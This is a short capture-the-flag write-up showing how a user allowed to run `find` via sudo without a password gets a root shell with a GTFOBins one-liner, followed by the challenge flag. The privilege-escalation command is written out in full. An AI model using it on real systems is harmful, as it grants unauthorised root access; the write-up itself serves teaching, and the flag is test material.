# Clippy (root)

When you login, you can run the command `sudo -l` to list what commands you can
run with superuser permissions.

```
Matching Defaults entries for clippy on 487881c1ed02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User clippy may run the following commands on 487881c1ed02:
    (ALL) NOPASSWD: /usr/bin/find

```

So, you can see that we are able to run `find` as root.

There is a website called GTFOBins[1] that lists ways to abuse common unix
commands.

The page for `find`[2] lists the following command for breaking out of restricted
shells, which is valid for this case:

```
find . -exec /bin/sh \; -quit
```


So, when we run that with sudo, we get a root shell.

Flag:
```
CTF{sudo_make_me_a_sandwich}
```


## References

* [1] https://gtfobins.github.io/
* [2] https://gtfobins.github.io/gtfobins/find/
